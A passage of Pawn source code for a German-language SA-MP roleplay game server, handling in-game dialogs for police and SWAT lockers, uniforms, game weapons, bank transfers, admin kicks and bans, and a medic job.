    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_PD1)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
				    if(SpielerInfo[playerid][uDienst] == 0)
				    {
				        SpielerInfo[playerid][uDienst] = 1;
				        SendClientMessage(playerid,COLOR_GREEN,"Du bist nun im Dienst");
				        SetPlayerColor(playerid,COLOR_POLICE);
				    }
				    else
					{
				        SpielerInfo[playerid][uDienst] = 0;
				        SendClientMessage(playerid,COLOR_RED,"Du bist nicht mehr im Dienst");
				        SetPlayerColor(playerid,COLOR_OFF);
				    }
         			new dtext[20];
					if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
					else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
 					ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
				}
				case 1:
				{
				    if(IstSpielerInFrak(playerid,1))
				    {
				    	ShowPlayerDialog(playerid,DIALOG_PD2,DIALOG_STYLE_LIST,"Police Department Spind","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6\nSkin 7\nSkin 8\nSkin 9\nSkin 10\nSkin 11\nSkin 12\nSkin 13\nSkin 14\nSkin 15\nSkin 16\nSkin 17","Auswählen","Zurück");
					}
					else if(IstSpielerInFrak(playerid,2))
					{
					    ShowPlayerDialog(playerid,DIALOG_PD6,DIALOG_STYLE_LIST,"Police Department Spind","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6\nSkin 7\nSkin 8\nSkin 9\nSkin 10\nSkin11\nSkin 12\nSkin 13","Auswählen","Zurück");
					}
				}
				case 2:
				{
				    ShowPlayerDialog(playerid,DIALOG_PD3,DIALOG_STYLE_LIST,"Police Department Spind","Schlagstock\nMesser\nTränengas\nDesert Deagle\n9mm\nShotgun\nMP5\nM4\nSniper Rifle\nSchutzweste","Auswählen","Zurück");
				}
	        }
	    }
	}
	else if(dialogid == DIALOG_PD3)
	{
	    if(response)
	    {
	     	new Float:money,waffe,ammo,weaponn[20],str[150];
	     	if(listitem == 0){ money = 0.50; waffe = 3; ammo = 1; 	weaponn = "Schlagstock 0.50$";}
			if(listitem == 1){ money = 3.0; waffe = 4; ammo = 1;		weaponn = "Messer 3$";}
			if(listitem == 2){ money = 5.0; waffe = 17; ammo = 5;		weaponn = "Tränengas 5$";}
			if(listitem == 3){ money = 10.0; waffe = 24; ammo = 50;	weaponn = "Desert Deagle 10$";}
			if(listitem == 4){ money = 8.0; waffe = 23; ammo = 50;	weaponn = "9mm 8$";}
			if(listitem == 5){ money = 3.0; waffe = 25; ammo = 10;	weaponn = "Shotgun 3$";}
			if(listitem == 6){ money = 12.0; waffe = 29; ammo = 100;	weaponn = "MP5 12$";}
			if(listitem == 7){ money = 20.0; waffe = 31; ammo = 100;	weaponn = "M4 20$";}
			if(listitem == 8){ money = 15.0; waffe = 34; ammo = 15;	weaponn = "Sniper Rifle 15$";}
			if(listitem == 9){ money = 20; waffe = 0; ammo = 0; GebeRuestung(playerid,99);	weaponn = "Schutzweste 20$";}
			GebeWaffe(playerid,waffe,ammo);
			if(IstSpielerInFrak(playerid,1))
			{
			    Fraktionskasse[1] -= money;
			    Frakkassespeichern(1);
				new name[MAX_PLAYER_NAME];
				GetPlayerName(playerid,name,sizeof(name));
				format(str,sizeof(str),"%s hat sich eine Waffe genommen. Waffe: %s",name,weaponn);
				FraktionsNachricht(1, 0xFF8C00FF, str);
				ShowPlayerDialog(playerid,DIALOG_PD3,DIALOG_STYLE_LIST,"Police Department Spind","Schlagstock\nMesser\nTränengas\nDesert Deagle\n9mm\nShotgun\nMP5\nM4\nSniper Rifle\nSchutzweste","Auswählen","Zurück");
			}
			else if(IstSpielerInFrak(playerid,2))
			{
			    Fraktionskasse[2] -= money;
			    Frakkassespeichern(2);
				new name[MAX_PLAYER_NAME];
				GetPlayerName(playerid,name,sizeof(name));
				format(str,sizeof(str),"%s hat sich eine Waffe genommen. Waffe: %s",name,weaponn);
				FraktionsNachricht(2, 0xFF8C00FF, str);
				ShowPlayerDialog(playerid,DIALOG_PD3,DIALOG_STYLE_LIST,"Police Department Spind","Schlagstock\nMesser\nTränengas\nDesert Deagle\n9mm\nShotgun\nMP5\nM4\nSniper Rifle\nSchutzweste","Auswählen","Zurück");
			}
		 }
	    else
		{
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_PD6)
	{
	    if(response)
	    {
	        new skin;
	        if(listitem == 0){skin = 282;}
	        if(listitem == 1){skin = 283;}
	        if(listitem == 2){skin = 284;}
	        if(listitem == 3){skin = 302;}
	        if(listitem == 4){skin = 303;}
	        if(listitem == 5){skin = 304;}
	        if(listitem == 6){skin = 305;}
	        if(listitem == 7){skin = 309;}
	        if(listitem == 8){skin = 310;}
	        if(listitem == 9){skin = 311;}
	        if(listitem == 10){skin = 25002;}
	        if(listitem == 11){skin = 25004;}
	        if(listitem == 12){skin = 25005;}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			SendClientMessage(playerid,COLOR_GREEN,"Skin ausgewählt");
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
	    }
	    else
		{
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_PD2)
	{
	    if(response)
	    {
	        new skin;
	        if(listitem == 0){skin = 307;}
	        if(listitem == 1){skin = 265;}
	        if(listitem == 2){skin = 266;}
	        if(listitem == 3){skin = 267;}
	        if(listitem == 4){skin = 280;}
	        if(listitem == 5){skin = 281;}
	        if(listitem == 6){skin = 284;}
	        if(listitem == 7){skin = 285;}
	        if(listitem == 8){skin = 300;}
	        if(listitem == 9){skin = 301;}
	        if(listitem == 10){skin = 303;}
	        if(listitem == 11){skin = 304;}
	        if(listitem == 12){skin = 305;}
	        if(listitem == 13){skin = 306;}
			if(listitem == 14){skin = 25002;}
			if(listitem == 15){skin = 25004;}
			if(listitem == 16){skin = 25005;}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			SendClientMessage(playerid,COLOR_GREEN,"Skin ausgewählt");
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
	    }
	    else
		{
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_TIMEL)
	{
	    if(response)
  		{
	        switch(listitem)
	        {
				case 0:
				{
				    CallLocalFunction("cmd_inventar","d",playerid);
				}
				case 1:
				{
				    CallLocalFunction("cmd_moebel","d",playerid);
				}
				case 2:
				{
				    CallLocalFunction("cmd_handy","d",playerid);
				}
				case 3:
				{
					CallLocalFunction("cmd_autos","d",playerid);
				}
				case 4:
				{
                    if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!");
        			CallLocalFunction("cmd_fraktion","d",playerid);
				}
				case 5:
				{
					CallLocalFunction("cmd_navi","d",playerid);
				}
				case 6:
				{
                    CallLocalFunction("cmd_stats","d",playerid);
				}
				case 7:
				{
                    CallLocalFunction("cmd_hilfe","d",playerid);
				}
				case 8:
				{
                    ShowPlayerDialog(playerid,DIALOG_SUPPORT,DIALOG_STYLE_INPUT,"Support","{FFFFFF}Gebe hier ein {00FF00}Thema{FFFFFF} für deine Meldung an die Admins ein:","Senden","Abbrechen");
				}
	        }
		}
	}
	else if(dialogid == BANK_KREDIT2)
	{
	    if(response == 1)
	    {
			switch(listitem)
			{
			    case 0:
			    {
					format(string,sizeof string,"Du hast einen Kredit über %.2f$ in 6 PayDay Raten beantragt.",Kreditsumme[playerid]);
					Kreditrate[playerid] = 6;
				}
			    case 1:
			    {
			        format(string,sizeof string,"Du hast einen Kredit über %.2f$ in 12 PayDay Raten beantragt.",Kreditsumme[playerid]);
			        Kreditrate[playerid] = 12;
			    }
			    case 2:
			    {
			        format(string,sizeof string,"Du hast einen Kredit über %.2f$ in 24 PayDay Raten beantragt.",Kreditsumme[playerid]);
			        Kreditrate[playerid] = 24;
			    }
			    case 3:
			    {
			        format(string,sizeof string,"Du hast einen Kredit über %.2f$ in 36 PayDay Raten beantragt.",Kreditsumme[playerid]);
			        Kreditrate[playerid] = 36;
			    }
			}
			SpielerInfo[playerid][uKredit] = 100;
			SendClientMessage(playerid,COLOR_GREEN,string);
	    }
	}
	else if(dialogid == DIALOG_BANK_EINZAHLEN)
	{
	    if(response)
	    {
			if(floatstr(inputtext) > SpielerInfo[playerid][uGeld])
			{
		 		SendClientMessage(playerid,COLOR_RED,"So viel Geld hast du nicht bei dir!");
		 		ShowPlayerDialog(playerid,DIALOG_BANK_EINZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du einzahlen?","Einzahlen","Abbrechen");
			}
			else if(floatstr(inputtext) < 0.01)
			{
				SendClientMessage(playerid,COLOR_RED,"Du kannst nicht unter 1Cent einzahlen!");
				ShowPlayerDialog(playerid,DIALOG_BANK_EINZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du einzahlen?","Einzahlen","Abbrechen");
			}
			else
			{
	 			KontoGeld(playerid,floatstr(inputtext),"Geld eingezahlt");
				GebeGeld(playerid,-floatstr(inputtext));
				format(string,sizeof string,"%.2f$ eingezahlt.",floatstr(inputtext)+0.001);
				SendClientMessage(playerid,COLOR_GREEN,string);
			}
		}
	}
	else if(dialogid == DIALOG_BANK_AUSZAHLEN)
	{
	    if(response)
	    {
		    if(floatstr(inputtext) > SpielerInfo[playerid][uKonto])
			{
				SendClientMessage(playerid,COLOR_RED,"So viel Geld ist nicht auf deinem Konto!");
				ShowPlayerDialog(playerid,DIALOG_BANK_AUSZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du abheben?","Abheben","Abbrechen");
			}
			else if(floatstr(inputtext) < 0.01)
			{
				SendClientMessage(playerid,COLOR_RED,"Du kannst nicht unter 1Cent auszahlen!");
				ShowPlayerDialog(playerid,DIALOG_BANK_AUSZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du abheben?","Abheben","Abbrechen");
			}
			else
			{
	 			KontoGeld(playerid,-floatstr(inputtext),"Geld abgehoben");
				GebeGeld(playerid,floatstr(inputtext));
				format(string,sizeof string,"%.2f$ abgehoben.",floatstr(inputtext)+0.001);
				SendClientMessage(playerid,COLOR_GREEN,string);
			}
		}
	}
	else if(dialogid == DIALOG_BANK_UEBERWEISEN)
	{
	    if(response)
	    {
		    if(sscanf(inputtext, "u", UberweisungPlayer[playerid]) || UberweisungPlayer[playerid] == INVALID_PLAYER_ID) { SendClientMessage(playerid,COLOR_RED,"Der Benutzer ist nicht verfügar!"); ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wem möchtest du Geld überweisen?","Weiter","Abbrechen"); }
			if(SpielerInfo[UberweisungPlayer[playerid]][uEingeloggt] == 1)
			{
			    if(SpielerInfo[UberweisungPlayer[playerid]][uLevel] >= 5)
			    {
					format(string,sizeof string,"Wie viel Geld möchtest du %s überweisen?",PlayerName(UberweisungPlayer[playerid]));
					ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN2,DIALOG_STYLE_INPUT,"{00D80A}Bank",string,"Weiter","Abbrechen");
				}
				else
				{
					SendClientMessage(playerid,COLOR_RED,"Der andere Benutzer muss mindestens Level 5 sein!");
					ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wem möchtest du Geld überweisen?","Weiter","Abbrechen");
				}
			}
			else
			{
			    SendClientMessage(playerid,COLOR_RED,"Der Benutzer ist nicht verfügar!");
				ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wem möchtest du Geld überweisen?","Weiter","Abbrechen");
			}
		}
	}
	else if(dialogid == DIALOG_BANK_UEBERWEISEN2)
	{
		if(response)
		{
		    if(sscanf(inputtext, "f", UberweisungGeld[playerid]))
			{
				SendClientMessage(playerid,COLOR_RED,"Gebe hier den Betrag ein!");
				format(string,sizeof string,"Wie viel Geld möchtest du %s überweisen?",PlayerName(UberweisungPlayer[playerid]));
				ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN2,DIALOG_STYLE_INPUT,"{00D80A}Bank",string,"Weiter","Abbrechen");
			}
			else if(UberweisungGeld[playerid] > SpielerInfo[playerid][uKonto])
			{
				SendClientMessage(playerid,COLOR_RED,"So viel Geld ist nicht auf deinem Konto!");
				format(string,sizeof string,"Wie viel Geld möchtest du %s überweisen?",PlayerName(UberweisungPlayer[playerid]));
				ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN2,DIALOG_STYLE_INPUT,"{00D80A}Bank",string,"Weiter","Abbrechen");
			}
			else if(UberweisungGeld[playerid] < 0.01)
			{
				SendClientMessage(playerid,COLOR_RED,"Du kannst nicht unter 1Cent überweisen!");
			 	format(string,sizeof string,"Wie viel Geld möchtest du %s überweisen?",PlayerName(UberweisungPlayer[playerid]));
			 	ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN2,DIALOG_STYLE_INPUT,"{00D80A}Bank",string,"Weiter","Abbrechen");
			}
			else ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN3,DIALOG_STYLE_INPUT,"{00D80A}Bank","Gebe hier den Verwendungszweck für deine Überweisung ein:","Fertig","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_BANK_UEBERWEISEN3)
	{
	    if(response)
	    {
		    if(sscanf(inputtext, "s[50]",UberweisungText[playerid]))
			{
				SendClientMessage(playerid,COLOR_RED,"Gebe hier den Verwendungszweck an!");
				ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN3,DIALOG_STYLE_INPUT,"{00D80A}Bank","Gebe hier den Verwendungszweck für deine Überweisung ein:","Fertig","Abbrechen");
			}
		    else
		    {
		        format(string,sizeof string,"Empfänger: %s (ID: %d)\nBetrag: %.2f\nVerwendungszweck: %s",PlayerName(UberweisungPlayer[playerid]),UberweisungPlayer[playerid],UberweisungGeld[playerid]+0.001,UberweisungText[playerid]);
		        ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN4,DIALOG_STYLE_MSGBOX,"{00D80A}Bank",string,"Überweisen","Abbrechen");
		    }
	    }
	}
	else if(dialogid == DIALOG_BANK_UEBERWEISEN4)
	{
	    if(response)
	    {
	        new string2[50];
	        format(string2,sizeof string2,"Überweisung an %s: %s",PlayerName(UberweisungPlayer[playerid]),UberweisungText[playerid]);
	        KontoGeld(playerid,-UberweisungGeld[playerid],string2);
	        format(string2,sizeof string2,"Überweisung von %s: %s",PlayerName(playerid),UberweisungText[playerid]);
	        KontoGeld(UberweisungPlayer[playerid],UberweisungGeld[playerid],string2);
	        format(string,sizeof string,"%s hat dir %.2f$ überwiesen, Verwendungszeck: %s",PlayerName(playerid),UberweisungGeld[playerid]+0.001,UberweisungText[playerid]);
	        SendClientMessage(UberweisungPlayer[playerid],COLOR_GREEN,string),
	        SendClientMessage(playerid,COLOR_GREEN,"Überweisung erfolgreich ausgeführt!");
	        UberweisungGeld[playerid] = -1;
	        UberweisungPlayer[playerid] = -1;
	    }
	}
	else if(dialogid == ADMIN_KICK)
	{
	    if(response)
	    {
     		if(SpielerInfo[ClickedID[playerid]][uAdmin] < 1)
	        {
			    format(string,sizeof string,"Admin %s hat %s gekickt, Grund: %s",PlayerName(playerid),PlayerName(ClickedID[playerid]),inputtext);
			    SendMessageToAll(COLOR_LIGHTRED,string);
			    format(string,sizeof string,"Du wurdest von %s gekickt, Grund: %s",PlayerName(playerid),inputtext);
			    SendClientMessage(ClickedID[playerid],COLOR_RED,string);
			    KWBLog(PlayerName(ClickedID[playerid]),PlayerName(playerid),"Kick",inputtext);
			    Kick(ClickedID[playerid]);
            }else{SendClientMessage(playerid,COLOR_RED,"Du kannst keinen Supporter / Administrator kicken!");}
		    AdminPanelAbbrechen(playerid);
	    }
	}
	else if(dialogid == ADMIN_BANN)
	{
	    if(response)
	    {
	        if(SpielerInfo[ClickedID[playerid]][uAdmin] < 1)
	        {
			    format(string,sizeof string,"Admin %s hat %s gebannt, Grund: %s",PlayerName(playerid),PlayerName(ClickedID[playerid]),inputtext);
			    SendMessageToAll(COLOR_LIGHTRED,string);
			    format(string,sizeof string,"Du wurdest von %s gebannt, Grund: %s",PlayerName(playerid),inputtext);
			    SendClientMessage(ClickedID[playerid],COLOR_RED,string);
			    SpielerInfo[ClickedID[playerid]][uBan] = 1;
			    KWBLog(PlayerName(ClickedID[playerid]),PlayerName(playerid),"Bann",inputtext);
			    SpielerInfo[ClickedID[playerid]][uBan] = 1;
			    Ban(ClickedID[playerid]);
			    panelfiles(ClickedID[playerid], playerid, 2,inputtext);
			}else{SendClientMessage(playerid,COLOR_RED,"Du kannst keinen Supporter / Administrator bannen!");}
		    AdminPanelAbbrechen(playerid);
	    }
	}
	/*else if(dialogid == ADMIN_TIMEBANN)
	{
		if(response)
	    {
	        if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens für eine Stunde bannen!");
			SpielerInfo[ClickedID[playerid]][uTimebann] = strval(inputtext);
	       	format(string,sizeof string,"Warum willst du %s zeitlich bannen?",PlayerName(ClickedID[playerid]));
	    	ShowPlayerDialog(playerid, ADMIN_TIMEBANN2, DIALOG_STYLE_INPUT, "Bann", string, "Bannen","Abbrechen");
	    }
	}*/
	else if(dialogid == DIALOG_SANI)
	{
	    if(response)
	    {
	        new str[150];
        	if(strval(inputtext) < -1) return SendClientMessage(playerid,COLOR_RED,"Du musst die richtige ID eingeben!");
        	if(!IsPlayerConnected(strval(inputtext)))return SendClientMessage(playerid,COLOR_RED,"Diesen Spieler gibt es nicht!");
        	if(Auftragaktiv[strval(inputtext)] != 1)return SendClientMessage(playerid,COLOR_RED,"Der Spieler hat keinen aktiven Auftrag!");
			format(str,sizeof(str),"Fire & Rescue %s ist unterwegs zu dir. Warte bis er eingetroffen ist.",PlayerName(playerid));
			SendClientMessage(strval(inputtext),COLOR_ORANGE,str);
			format(str,sizeof(str),"Begieb dich zu %s und werde ihn wiederbeleben.",PlayerName(strval(inputtext)));
			SendClientMessage(playerid,COLOR_ORANGE,str);
			Auftragaktiv[strval(inputtext)] = 0;
			eristsani[playerid] = 1;
			HatAuftrag[playerid] = strval(inputtext);
			HatAuftrag[strval(inputtext)] = playerid;
			new Float:xx,Float:yy,Float:zz;
			GetPlayerPos(strval(inputtext),xx,yy,zz);
			SetPlayerCheckpoint(playerid,xx,yy,zz-1,3);
			cpaktiv[playerid] = 1;
	    }
	}
	else if(dialogid == DIALOG_SWAT)
	{
	    if(response)
	    {
	        new name[MAX_PLAYER_NAME];
	        GetPlayerName(playerid,name,sizeof(name));
	        new str[110];
	        WFrak(playerid);
			if(listitem == 0)
			{
			    SetPlayerSkin(playerid,285);
			    SpielerInfo[playerid][uSkin] = 285;
			    SpielerInfo[playerid][uZiviFrak] = 1;
			}
			if(listitem == 1)
			{
			    if(IsPlayerAttachedObjectSlotUsed(playerid,3))
			 	{
			  		RemovePlayerAttachedObject(playerid,3);
					GebeRuestung(playerid,0);
			 	}
			  	else
			   	{
			    	SetPlayerAttachedObject(playerid, 3, 19142, 1, 0.1079, 0.0379, 0.0000, -7.1000, 0.0000, 0.0000, 1.0000, 1.1350, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
					new Float:health;
					GetPlayerHealth(playerid,health);
					GebeRuestung(playerid,health+50);
					if(Mitglied[playerid] == 1)
					{
					    Fraktionskasse[1] -= 3.0;
					    Frakkassespeichern(1);
					}
					else if(Mitglied[playerid] == 2)
					{
                        Fraktionskasse[2] -= 3.0; Frakkassespeichern(2);
					}
					format(str,sizeof(str),"%s hat sich eine Weste aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(Mitglied[playerid], 0xFF8C00FF, str);
			    }
			}
            if(listitem == 2)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid,5))
			 	{
			  		RemovePlayerAttachedObject(playerid,5);
					GebeRuestung(playerid,0);
			 	}
			  	else
			   	{
			    	SetPlayerAttachedObject(playerid, 5, 19141, 2, 0.1029, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0550, 1.1159, 0xFFFFFFFF, 0xFFFFFFFF);
					new Float:health;
					GetPlayerHealth(playerid,health);
					GebeRuestung(playerid,health+50);
					if(Mitglied[playerid] == 1)
					{
					    Fraktionskasse[1] -= 10.0; Frakkassespeichern(1);
					}
					else if(Mitglied[playerid] == 2)
					{
	                    Fraktionskasse[2] -= 10.0; Frakkassespeichern(2);
					}
					format(str,sizeof(str),"%s hat sich einen Helm aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(Mitglied[playerid], 0xFF8C00FF, str);
	    		}
			}
			if(listitem == 3) //deagle
			{
			    GebeWaffe(playerid,24,50);
				if(Mitglied[playerid] == 1)
				{
				    Fraktionskasse[1] -= 10.0; Frakkassespeichern(1);
				}
				else if(Mitglied[playerid] == 2)
				{
                    Fraktionskasse[2] -= 10.0; Frakkassespeichern(2);
				}
				format(str,sizeof(str),"%s hat sich eine Deagle aus dem S.W.A.T Panzer geholt!",name);
				FraktionsNachricht(Mitglied[playerid], 0xFF8C00FF, str);
				//DEAGLE
			}
			if(listitem == 4)
			{
			    GebeWaffe(playerid,28,150);
				if(Mitglied[playerid] == 1)
				{
				    Fraktionskasse[1] -= 12.0; Frakkassespeichern(1);
				}
				else if(Mitglied[playerid] == 2)
				{
                    Fraktionskasse[2] -= 12.0; Frakkassespeichern(2);
				}
				format(str,sizeof(str),"%s hat sich eine MP5 aus dem S.W.A.T Panzer geholt!",name);
				FraktionsNachricht(Mitglied[playerid], 0xFF8C00FF, str);
				//MP5
			}
			if(listitem == 5)
			{
			    GebeWaffe(playerid,31,150);
				if(Mitglied[playerid] == 1)
				{
				    Fraktionskasse[1] -= 20.0; Frakkassespeichern(1);
				    format(str,sizeof(str),"%s hat sich eine M4 aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(1, 0xFF8C00FF, str);
				}
				else if(Mitglied[playerid] == 2)
				{
                    Fraktionskasse[2] -= 20.0; Frakkassespeichern(2);
                    format(str,sizeof(str),"%s hat sich eine M4 aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(2, 0xFF8C00FF, str);
				}
				//M4
			}
			if(listitem == 6)
			{
			    GebeWaffe(playerid,34,15);
			    if(Mitglied[playerid] == 1)
				{
				    Fraktionskasse[1] -= 15.0; Frakkassespeichern(1);
				    format(str,sizeof(str),"%s hat sich eine Sniper aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(1, 0xFF8C00FF, str);
				}
				else if(Mitglied[playerid] == 2)
				{
                    Fraktionskasse[2] -= 15.0; Frakkassespeichern(2);
                    format(str,sizeof(str),"%s hat sich eine Sniper aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(2, 0xFF8C00FF, str);
				}
				//Sniper
			}
			if(listitem == 7)
			{
			    GebeWaffe(playerid,17,5);
			    if(Mitglied[playerid] == 1)
				{
				    Fraktionskasse[1] -= 5.0; Frakkassespeichern(1);
    				format(str,sizeof(str),"%s hat sich Tränengas aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(1, 0xFF8C00FF, str);
				}
				else if(Mitglied[playerid] == 2)
				{
                    Fraktionskasse[2] -= 5.0; Frakkassespeichern(2);
                    format(str,sizeof(str),"%s hat sich Tränengas aus dem S.W.A.T Panzer geholt!",name);
					FraktionsNachricht(2, 0xFF8C00FF, str);
				}
				//Tränengas
			}
 			ShowPlayerDialog(playerid, DIALOG_SWAT, DIALOG_STYLE_LIST, "SWAT Rüstung","SWAT Skin\nWeste -3$\nHelm -3$\nDesert Deagle -10$\nMP5 -12$\nM4 -20$\nSniper -15$\nTränengas -5$", "Weiter", "Zurück");
		}
	}
	else if(dialogid == DIALOG_MC1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				if(SpielerInfo[playerid][uDienst] == 0)
				{
        			SetPlayerColor(playerid,COLOR_MEDIC);
                    SpielerInfo[playerid][uDienst] = 1;
                    GebeLeben(playerid,100);
                    GebeRuestung(playerid,100);
                    SendClientMessage(playerid,COLOR_BLUE,"Du bist nun im Dienst!");
				}
				else{
				    SpielerInfo[playerid][uDienst] = 0;
				    GebeRuestung(playerid,0);
				    SetPlayerColor(playerid,COLOR_OFF);
				    SendClientMessage(playerid,COLOR_RED,"Du bist nicht mehr im Dienst!");
				}
				if(SpielerInfo[playerid][uDienst] == 0){ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst:{CD0000} Nein{FEFEFE}\nSkin Wählen","Auswählen","Beenden");}else{ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst:{CD0000} Ja{FEFEFE}\nSkin Wählen","Auswählen","Beenden");}
	        }
	        if(listitem == 1)
	        {
                ShowPlayerDialog(playerid,DIALOG_MC2,DIALOG_STYLE_LIST,"Medic - Skin Wählen","Skin 1\nSkin 2\nSkin 3\nSkin 4","Auswählen","Zurück");
	        }

	    }
	}
	else if(dialogid == DIALOG_MC2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
                SetPlayerSkin(playerid,275);
                SpielerInfo[playerid][uSkin]= 275;
                SpielerInfo[playerid][uZiviFrak] = 1;
	        }
	        if(listitem == 1)
	        {
	            SetPlayerSkin(playerid,274);
             	SpielerInfo[playerid][uSkin]= 274;
             	SpielerInfo[playerid][uZiviFrak] = 1;
	        }
	        if(listitem == 2)
	        {
	            SetPlayerSkin(playerid,276);
             	SpielerInfo[playerid][uSkin]= 276;
             	SpielerInfo[playerid][uZiviFrak] = 1;
	        }
	        if(listitem == 3)
	        {
	            SetPlayerSkin(playerid,308);
             	SpielerInfo[playerid][uSkin]= 308;
             	SpielerInfo[playerid][uZiviFrak] = 1;
	        }
   		    if(SpielerInfo[playerid][uDienst] == 0)
		    {
		        ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst:{CD0000} Nein{FEFEFE}\nSkin Wählen","Auswählen","Beenden");
		    }
		    else{
		        ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst: {00A614}Ja{FEFEFE}\nSkin Wählen","Auswählen","Beenden");
		    }

	    }
	    else{
	    	if(SpielerInfo[playerid][uDienst] == 0)
		    {
		        ShowPlayerDialog(playerid,DIALOG_MC1,DIALOG_STYLE_LIST,"Medic/Skin Wahl/Dienst","{FEFEFE}Im Dienst:{CD0000} Nein{FEFEFE}\nSkin Wählen","Auswählen","Beenden");
		    }
		    else{
